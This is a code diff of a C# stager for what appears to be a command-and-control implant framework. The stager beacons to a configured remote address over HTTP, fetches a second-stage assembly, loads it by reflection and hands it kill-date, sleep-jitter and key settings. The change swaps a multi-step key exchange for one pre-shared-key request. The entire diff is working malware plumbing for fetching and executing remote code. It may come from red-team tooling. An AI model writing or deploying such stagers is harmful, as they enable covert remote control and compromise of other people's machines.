@@ -8,7 +8,6 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Reflection;
-using System.Text;
 
 namespace Stager
 {
@@ -16,10 +15,8 @@ namespace Stager
     {
         static string AgentID;
 
-        static Crypto Crypto;
         static CommModule CommModule;
         static StagerModule StagerModule;
-        static byte[] SessionKey;
 
         static bool Staged = false;
 
@@ -38,7 +35,6 @@ namespace Stager
         public static void Execute()
         {
             AgentID = Utilities.GetRandomString(6);
-            Crypto = new Crypto();
 
             StagerModule = new StagerModule
             {
@@ -46,18 +42,8 @@ namespace Stager
                 {
                     new StagerModule.StagerCommand
                     {
-                        Name = "Stage0Response",
-                        Delegate = Stage0Response
-                    },
-                    new StagerModule.StagerCommand
-                    {
-                        Name = "Stage1Response",
-                        Delegate = Stage1Response
-                    },
-                    new StagerModule.StagerCommand
-                    {
-                        Name = "Stage2Response",
-                        Delegate = Stage2Response
+                        Name = "StageResponse",
+                        Delegate = StageResponse
                     }
                 }
             };
@@ -65,7 +51,7 @@ namespace Stager
 
             CommModule = new HTTPCommModule(AgentID, ConnectAddress, ConnectPort);
             
-            SendStage0();
+            SendStageRequest();
 
             System.Threading.Thread.Sleep(30000);
 
@@ -75,23 +61,7 @@ namespace Stager
             {
                 if (CommModule.RecvData(out AgentMessage Message))
                 {
-                    C2Data c2Data;
-
-                    if (Message.IV == null)
-                    {
-                        try
-                        {
-                            c2Data = Utilities.DeserialiseData<C2Data>(Message.Data);
-                        }
-                        catch
-                        {
-                            c2Data = Crypto.Decrypt(Message.Data);
-                        }
-                    }
-                    else
-                    {
-                        c2Data = Utilities.DecryptData<C2Data>(Message.Data, SessionKey, Message.IV);
-                    }
+                    var c2Data = Crypto.Decrypt<C2Data>(Message.Data, Message.IV);
 
                     var callback = StagerModule.Commands
                         .FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase))
@@ -102,68 +72,26 @@ namespace Stager
             }
         }
 
-        static void SendStage0()
+        static void SendStageRequest()
         {
-            var c2Data = Utilities.SerialiseData(
+            var c2Data = Crypto.Encrypt(
                 new C2Data
                 {
                     Module = "Core",
-                    Command = "Stage0Request",
-                    Data = Encoding.UTF8.GetBytes(Crypto.PublicKey)
-                });
+                    Command = "StageRequest"
+                },
+                out byte[] iv);
 
             CommModule.SendData(
                 new AgentMessage
                 {
                     AgentID = AgentID,
-                    Data = c2Data
+                    Data = c2Data,
+                    IV = iv
                 });
         }
 
-        static void Stage0Response(C2Data C2Data)
-        {
-            var serverKey = Encoding.UTF8.GetString(C2Data.Data);
-
-            Crypto.ImportServerKey(serverKey);
-
-            var data = Crypto.Encrypt(new C2Data
-            {
-                Module = "Core",
-                Command = "Stage1Request"
-            });
-
-            CommModule.SendData(new AgentMessage
-            {
-                AgentID = AgentID,
-                Data = data
-            });
-        }
-
-        static void Stage1Response(C2Data C2Data)
-        {
-            SessionKey = new byte[32];
-            var challenge = new byte[8];
-
-            Buffer.BlockCopy(C2Data.Data, 0, SessionKey, 0, 32);
-            Buffer.BlockCopy(C2Data.Data, 32, challenge, 0, 8);
-
-            var data = Utilities.EncryptData(new C2Data
-            {
-                Module = "Core",
-                Command = "Stage2Request",
-                Data = challenge
-            },
-            SessionKey, out byte[] iv);
-
-            CommModule.SendData(new AgentMessage
-            {
-                AgentID = AgentID,
-                Data = data,
-                IV = iv
-            });
-        }
-
-        static void Stage2Response(C2Data C2Data)
+        static void StageResponse(C2Data C2Data)
         {
             CommModule.Stop();
             Staged = true;
@@ -173,12 +101,12 @@ namespace Stager
             asm.GetType("Agent.Stage").GetMethod("HTTPEntry").Invoke(null, new object[]
             {
                 AgentID,
-                SessionKey,
                 KillDate,
                 ConnectAddress,
                 ConnectPort,
                 SleepInterval,
-                SleepJitter
+                SleepJitter,
+                Crypto.EncryptionKey
             });
         }
 
